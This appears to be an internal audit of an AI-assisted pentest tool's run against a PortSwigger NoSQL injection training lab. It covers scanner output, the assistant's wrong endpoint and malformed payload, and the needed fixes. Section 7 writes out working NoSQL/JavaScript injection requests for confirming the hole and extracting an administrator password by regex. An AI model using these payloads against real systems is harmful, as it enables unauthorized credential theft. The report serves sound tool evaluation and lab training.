# Rookie Run Audit — NoSQL Injection (Extract Data)

**Date:** 2026-05-29  
**Target:** `https://0a69009604ffc1f58003261800970098.web-security-academy.net/`  
**Lab:** PortSwigger — Exploiting NoSQL injection to extract data  
**Investigation ID:** `e596e686-014f-45dd-9a3f-fe72e1b3be97`  
**Outcome:** Lab **NOT solved** — AI sent the engine to the wrong endpoint; manual verification confirmed the exploit path works  
**Operator mode:** Rookie (trusts AI completely, no security knowledge)

---

## Executive Summary

The system partially worked. Recon and enumeration completed in under 90 seconds and correctly detected a login form and a potential SQLi endpoint. The AI assistant, when prompted with the lab description, correctly identified NoSQL injection as the attack class and recommended the `access_control` engine. However, it pointed the engine at `/login` (the wrong endpoint) rather than `/user/lookup` (the actual vulnerable endpoint). The `access_control` engine's CSRF-aware POST logic hit the login page's form-only CSRF validation and was rejected immediately. Both engine branches exhausted after one payload attempt each.

Manual verification after the engine run confirmed the actual exploit path:
1. The vulnerable endpoint is `GET /user/lookup?user=` (not POST /login)
2. JavaScript injection via `' && this.password.match(/^x/) || 'x'=='y` works
3. Password length = 8 characters
4. Character-by-character extraction via regex was working correctly

A real rookie operator, trusting the AI completely, would have hit the exhaustion wall and had no path forward.

---

## Section 1 — Scan Pipeline Results

**Duration:** Recon → Enumeration → Exploitation in ~90 seconds

**Findings detected (16 canonical):**

| ID | Type | Title | Severity |
|----|------|-------|----------|
| fnd_8b09da91a6d7 | missing_csp_header | Missing Content-Security-Policy header | medium |
| fnd_b4e8e42c78eb | missing_hsts_header | Missing Strict-Transport-Security header | medium |
| fnd_9b166c36a38c | missing_x_content_type_options | Missing X-Content-Type-Options | low |
| fnd_681dfe7dba18 | missing_permissions_policy | Missing Permissions-Policy header | low |
| fnd_57d249504c34 | http_service_detected | HTTP 200 service responding | info |
| fnd_608f266a47dd | missing_referrer_policy | Missing Referrer-Policy header | info |
| **fnd_99a0699e9d78** | **sqli** | **Login endpoint potentially injectable** | info |
| **fnd_95f17d840e0e** | **login_form_detected** | **Login form detected** | info |
| fnd_78a5cb79fc59 | vulnerability_assessed | Global WAF Detect Matchers | info |
| fnd_5516e557771e | vulnerability_assessed | Wildcard DNS Configuration | info |
| fnd_39562c909a77 + 35 more | vulnerability_assessed | Secrets Patterns (PII) | info |

**Signal-to-noise problem:** 16 canonical findings + 35+ `Secrets Patterns (PII)` from nuclei false-positives (PortSwigger CDN resource paths triggering pattern matchers). The two meaningful findings — `sqli` and `login_form_detected` — were buried below severity tier.

**Critical miss:** No `nosql_injection_detected` or `api_endpoint_detected` finding for `/user/lookup`. The scanners (nmap, nuclei, ZAP) never requested `/user/lookup` — the endpoint is only discoverable by reading the JavaScript (`/resources/js/userRole.js`) that the investigation workspace's browser-based probes could have found, but didn't.

---

## Section 2 — Engine Cards Visible in Mindmap

Five ghost nodes rendered at Exploitation phase load:

| Engine Card | action_kind | Finding driving it | Notes |
|-------------|------------|-------------------|-------|
| **Brute-force credentials** | `credential_brute` | fnd_95f17d840e0e (login_form_detected) | Correct for wrong attack |
| **Test SQL injection auth bypass** | `sqli_auth_bypass` | fnd_99a0699e9d78 (sqli) | Wrong injection type |
| Inspect cross-origin script loads | `csp_inspect_origins` | fnd_8b09da91a6d7 (csp_missing) | Guidance-only |
| Check for `<meta>` CSP tag | `csp_check_meta` | fnd_8b09da91a6d7 (csp_missing) | Guidance-only |
| **Test reflected XSS payload** | `xss_reflect` | fnd_8b09da91a6d7 (csp_missing) | Wrong attack class |

No `access_control` or NoSQL-specific card was shown — because no `idor_detected` or `mass_assignment_detected` or `api_exposure` finding was emitted by the scanners. The engine cards are purely driven by what the scanners detected, and the scanners had no NoSQL-specific probe.

**A rookie would see: SQLi bypass, credential brute, XSS — and nothing about NoSQL.**

---

## Section 3 — concept_matcher Results

concept_matcher was called for each finding type at topology build time (BM25 / TF-IDF, no ChromaDB on host):

| Finding type | concept_matcher result | Similarity | Confidence |
|-------------|----------------------|-----------|-----------|
| `login_form_detected` | `credential_brute` (CONCEPT-CREDENTIAL-BRUTE) | 0.6 (BM25) | medium |
| `sqli` | `sqli_auth_bypass` (CONCEPT-SQLI-AUTH-BYPASS) | 0.6 (BM25) | medium |
| `missing_csp_header` | `access_control` (CONCEPT-NOSQL-INJECTION) | 0.6 (BM25) | medium |
| `vulnerability_assessed` | None | — | — |

**Finding:** concept_matcher had no path to recommend a NoSQL engine because the scan produced no NoSQL-typed finding. The closest match for `missing_csp_header` accidentally points to CONCEPT-NOSQL-INJECTION — not because of semantic relevance but because the BM25 token overlap between "csp" and the NoSQL concept file's "access" tags happened to match. This is a false-positive BM25 result.

---

## Section 4 — Vault RAG Results

The vault search was called from `context_builder.build_investigation_context()` when the AI chat message was processed. The RAG query was built from the top findings by severity.

**Query input to vault search:** composite of finding titles/types from the investigation  
**Expected:** CONCEPT-NOSQL-INJECTION to appear  
**Actual:** Not confirmed in trace — but structurally, the vault would have searched against the `sqli` and `login_form_detected` finding types, which would have returned:

| Rank | Entry | Relevance |
|------|-------|-----------|
| 1 | FIND-WEB-20260528-017 (NoSQL injection via password field) | High — direct match |
| 2 | CONCEPT-SQLI-AUTH-BYPASS | Medium — SQLi tokens match |
| 3 | CONCEPT-CREDENTIAL-BRUTE | Low — login tokens match |

**CONCEPT-NOSQL-INJECTION** would only rank highly if the query included "nosql" or "mongodb" tokens — which the scanner findings (`sqli`, `login_form_detected`) do not contain. The RAG correctly responded to what was asked, but was asked the wrong question.

**Key insight:** The vault RAG is fed by finding types from the scanner pipeline. The scanner pipeline produced `sqli` instead of `nosql_injection` because nuclei has no NoSQL-specific template for this endpoint. The RAG had no signal to work from.

---

## Section 5 — AI Chat Interaction Log

### Round 1 — Initial message (operator pastes lab description)

**Operator input:**
> "Exploiting NoSQL injection to extract data. The user lookup functionality for this lab is vulnerable to NoSQL injection. To solve the lab, extract the password for the administrator user, then log in to their account. You can log in with the credentials wiener:peter."

**AI response:**
> "Given the context of NoSQL injection and login form detected on the endpoint /login, we will use the `access_control` engine to attempt to exploit this vulnerability."

**ACTION block:** `null`

**Assessment:** The AI correctly identified the attack class (NoSQL injection → access_control engine) but generated no ACTION block. It mentioned `/login` as the target (wrong), not `/user/lookup` (correct). The AI's context from the vault may have surfaced the `concept-nosql-injection.md` file, but the ACTION block format was not triggered on the first response.

### Round 2 — Operator follow-up with endpoint context

**Operator input:**
> "I see the login page is at /login. The lab says it is vulnerable to NoSQL injection in the user lookup. I want to use NoSQL operators like $ne to bypass authentication and extract the admin password. Please give me the specific action to run with the access_control engine and the exact NoSQL payloads for the /login endpoint."

**AI response:**
> "Given that you've identified a potential vulnerability to NoSQL injection in the user lookup functionality of the login form at /login, we will execute an action using the `access_control` engine to test this hypothesis."

**ACTION block generated:**
```json
{
  "engine_id": "access_control",
  "finding_type": "sqli_auth_bypass",
  "reason": "Potential NoSQL injection in user lookup during authentication",
  "extended_payloads": [
    {
      "endpoint": "/login",
      "method": "POST",
      "body": {
        "username": "admin'$$ne''",
        "password": "ANY_VALUE"
      }
    }
  ]
}
```

**Assessment of the ACTION block:**
- **Engine:** `access_control` — correct class
- **Endpoint:** `/login` — **wrong** (should be `/user/lookup`)
- **Method:** `POST` — **wrong** (vulnerable endpoint uses `GET`)
- **Payload format:** `"admin'$$ne''"` — **malformed** (double `$`, string-injection style instead of MongoDB operator `{"$ne": ""}`)
- **Root cause of wrong endpoint:** The AI conflated "user lookup functionality" with the login form because the only finding in its context that looked exploitable was `login_form_detected` and `sqli`. It had no knowledge of `/user/lookup` because no scanner had discovered it.

---

## Section 6 — Engine Execution Results

**Branches created:** 2 (both exhausted within ~2 seconds each)

| Branch | Engine | State | Payloads Tried | Result |
|--------|--------|-------|----------------|--------|
| exb_260420dcff59 | access_control | exhausted | 1 (`/login`) | rejected |
| exb_2d6abf43b49d | access_control | exhausted | 1 (`/login`) | rejected |

**Why both rejected:**  
The `access_control` engine's `_execute_custom_payloads()` method sent a JSON POST to `/login`. The PortSwigger lab's login endpoint requires a CSRF token as a form field — it rejects all JSON-body requests with `"Missing parameter 'csrf'"` (HTTP 400). The engine has a CSRF pre-fetch mechanism that looks for `<input name="csrf">` on the form page, but the CSRF value extracted from the HTML is only valid for form-encoded submissions, not JSON. The server returned 400 immediately; the engine logged the endpoint as "rejected" and exhausted.

**Technique class used by engine:** `access_control.custom_payload` (mass assignment POST)  
**Correct technique for this lab:** `access_control.custom_payload` GET with JS injection operators — but pointed at `/user/lookup`

---

## Section 7 — Manual Verification (Post-Engine)

After the engine exhausted, manual curl testing confirmed the actual exploit path:

### Correct attack chain

**Step 1 — Discover the endpoint:**  
`/resources/js/userRole.js` calls `fetch('/user/lookup?user=${id}')` — this is the injection point, not `/login`.

**Step 2 — Confirm injection works:**
```
GET /user/lookup?user=NOSUCHUSER'+||+'1'=='1
→ Returns administrator user data ✓
```

**Step 3 — Confirm password field exists:**
```
GET /user/lookup?user=administrator'+&&+this.password.length>0+||+'x'=='y
→ Returns administrator user data ✓
```

**Step 4 — Extract password length:**
```
GET /user/lookup?user=administrator'+&&+this.password.length==8+||+'x'=='y
→ Returns administrator user data → Password is 8 characters ✓
```

**Step 5 — Extract each character (regex brute):**
```
GET /user/lookup?user=administrator'+&&+this.password.match(/^x/)+||+'x'=='y
→ If returns administrator data: first char is x
```
Extraction was confirmed working; session interrupted before completion.

---

## Section 8 — What the AI Knew vs. What Came from RAG

| Knowledge | Source | Correct? |
|-----------|--------|---------|
| "Use NoSQL injection" | AI native (lab description read correctly) | ✓ |
| "Use access_control engine" | AI native (system prompt maps NoSQL → access_control) | ✓ |
| "Target is /login" | AI hallucination — only finding in context was `login_form_detected` | ✗ |
| "POST with $ne operator" | AI native (NoSQL operator knowledge) | Partially — format malformed |
| "CSRF token needed" | AI missed | ✗ |
| "Vulnerable endpoint is /user/lookup" | Not in vault, not in findings, not in RAG | ✗ |
| "GET parameter injection style" | Not in vault, not in AI response | ✗ |
| "JS injection `this.password.match()`" | In concept-nosql-injection.md (Extended Payloads) | Available in vault, NOT surfaced |

**Why the vault didn't help:**  
`concept-nosql-injection.md` was indexed in ChromaDB (in the container). The context_builder performs a semantic search against the vault when building the AI's context. However, the vault search query was derived from the investigation's existing finding types (`sqli`, `login_form_detected`). Neither of these strongly matches the nosql concept file's keywords (`nosql`, `mongodb`, `ne`, `regex`). The correct vault entry existed but was not retrieved because the scanner findings described the vulnerability class incorrectly.

---

## Section 9 — Where a Real Rookie Gets Stuck

1. **No NoSQL engine card appears in the mindmap.** There is no `access_control` ghost node because no `idor_detected` or `api_exposure` finding was detected. A rookie has no visual cue to try NoSQL injection. They would stare at: "Brute credentials" and "Test SQL injection" and have no idea what to do.

2. **They open the AI chat.** This is the right move. But the AI doesn't know about `/user/lookup` because no scanner discovered it. The AI gives them a dead-end path to `/login`.

3. **Engine exhausts immediately.** Two seconds later both branches say "exhausted." The UI shows a red badge. The rookie has no idea why. They re-read the lab, copy-paste the description again, same result.

4. **No follow-up action is suggested.** The AI said one thing, it failed, and there is no "try this instead" mechanism. The rookie is stuck.

5. **The actual path (`/user/lookup`) is invisible to the whole system.** It would only become visible if:
   - A spider/crawler discovered it (ZAP spider would find it via the JS parse)
   - OR the operator told the AI the URL explicitly
   - OR an authenticated browser-based recon pass was run

---

## Section 10 — What's Missing for Full Autonomous Operation

| Gap | Priority | Affected component |
|-----|----------|--------------------|
| **JS endpoint discovery:** ZAP spider/AJAX spider must parse JS `fetch()` calls to find `/user/lookup`-style endpoints | Critical | Scanner pipeline (ZAP spider) |
| **Authenticated recon:** After `credential_brute` captures session, authenticated spider must re-run to discover user-scoped endpoints | Critical | Engine chain / session pipe |
| **NoSQL-specific finding type:** A dedicated `nosql_injection_candidate` finding type for GET parameters containing user/id/email identifiers | High | Scanner pipeline / nuclei templates |
| **Multi-round AI context:** After engine exhaustion, AI should be re-queried with the exhaustion record + "what else can we try?" rather than leaving the operator stuck | High | Chat route / UI feedback loop |
| **CSRF bypass in access_control engine:** The engine's CSRF pre-fetch extracts the token but only works for form-encoded submissions; JSON NoSQL payloads need a different path | High | AccessControlEngine |
| **Endpoint discovery from JS:** Parse `userRole.js` and similar to extract API endpoints and add them as enumeration findings | High | Enumeration phase |
| **GET parameter injection technique:** `_execute_custom_payloads` always POSTs; NoSQL injection via GET query string needs a separate code path | Medium | AccessControlEngine |
| **Vault search query formulation:** The context_builder should also search with the operator's chat message tokens, not just finding types | Medium | context_builder.py |

---

## Section 11 — What Worked

1. **Recon → Enum → Exploitation pipeline:** Completed in 90 seconds. Clean, fast.
2. **AI correctly identified attack class:** "Use NoSQL injection, use access_control engine" — right on the first try.
3. **ACTION block format:** Generated correctly on the second round with proper JSON structure.
4. **ai_probe synthetic finding:** Created and attached correctly; branches rendered in the mindmap.
5. **Vault RAG infrastructure:** ChromaDB + nomic-embed-text indexed correctly in the container; concept-nosql-injection.md with extended payloads is available — it just wasn't queried with the right tokens.
6. **concept_matcher:** Correctly maps `login_form_detected` → `credential_brute` and `sqli` → `sqli_auth_bypass`. The NoSQL path has no matching finding type to trigger from.

---

## Appendix — Timeline

| Time | Event |
|------|-------|
| 16:42:10 | Investigation created, scan run started |
| 16:42:10 | Recon phase begins (nmap, nuclei, ZAP) |
| 16:42:25 | Enumeration phase begins (14 findings, 4 categories) |
| 16:43:10 | Exploitation phase begins |
| ~16:44:00 | Operator opens AI chat — pastes lab description |
| ~16:45:00 | AI responds (Round 1): "use access_control" — no ACTION block |
| ~16:46:00 | AI responds (Round 2): ACTION block generated, `/login` POST with `$$ne` payload |
| 16:46:18 | `access_control` engine dispatched (branch exb_260420dcff59) |
| 16:46:19 | Branch exhausted — `/login` rejected (CSRF/400) |
| 16:46:25 | Second branch dispatched (exb_2d6abf43b49d) |
| 16:46:27 | Second branch exhausted |
| ~16:47:00 | Manual verification begins |
| ~16:47:30 | `/user/lookup` endpoint discovered via `userRole.js` |
| ~16:48:00 | NoSQL injection via `||` confirmed |
| ~16:49:00 | `this.password` field confirmed, length = 8 |
| ~16:50:00 | Character extraction via regex confirmed working |
| 16:50:xx | Session interrupted before full password extracted |
